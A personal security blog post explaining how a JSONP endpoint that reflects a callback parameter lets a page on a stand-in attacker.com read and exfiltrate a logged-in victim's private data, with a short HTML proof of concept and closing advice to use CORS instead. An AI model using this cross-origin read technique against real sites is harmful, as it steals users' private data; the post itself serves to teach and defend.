---
layout: post
title: "The Dangers of JSONP"
date: 2016-07-05 16:34:03 -0500
comments: true
categories: 
---

This post is about how I learned of JSONP as an attack vector. This isn't a new vulnerability, but it's just nice that I discovered it on my own. 

###A note on Same-Origin Policy
Same-Origin Policy (SOP) prevents a webpage from reading data on a different domain. So if you open a tab with hacker.com, your browser won't let it read data on bank.com. There are notable exceptions, like `<img>` and `<script>` tags. However, browsers strictly limit their scope. For example, a webpage can only execute a cross-domain script, not read its contents. 

###Some interesting behavior
Playing with traffic in Burp I observed the following behavior. Whatever you pass in the "callback" parameter is reflected in the response.

Request: `GET /sensitive_resource?callback=myFunction`   
Response: `myFunction({"key1":"data1", "key2":"data2", ...})`

Request: `GET /sensitive_resource?callback=AAAAAAAA`   
Response: `AAAAAAAA({"key1":"data1", "key2":"data2", ...})`

My first instinct was to test for XSS, but all output was correctly encoded. The response contained private data, but it required an authenticated session to access.

(Later on I learned that this request/response behavior is an old technique called JSONP. It was used to get around Same-Origin Policy restrictions before CORS came about.)

###The exploit
What if we request that resource from a `<script>` tag on the attacker's webpage? Notice that the response data is wrapped with a JavaScript function call that we control. Can we pre-define that function on the attacker's webpage?

**www.attacker.com:**	
```html
<script>
var exfil_function = function(data) {
	parsed_data = response_specific_parsing(data);
	alert(parsed_data); 
	exfil(parsed_data);
};
</script>

<script src="https://www.victim.com/sensitive_resource?callback=exfil_function"> </script>
```

And it works! The cross-domain script executes `exfil_function({"key1":"data1", "key2":"data2", ...})`, and since we control the definition of `exfil_function`, we can have it read the data! 

Now when an authenticated victim views this malicious webpage, it does a cross-domain read of the sensitive resource and exfiltrates the private data. 

###Lesson: don't use JSONP with private data
JSONP effectively disables Same-Origin Policy for a resource. So be cautious of using it with private data. Instead, use CORS, which gives you fine-grained and securely designed control over cross-origin sharing. 

A slightly related vulnerability is [JSON Hijacking](http://haacked.com/archive/2009/06/25/json-hijacking.aspx/). In conclusion, do not return sensitive data wrapped in JavaScript functions or arrays.
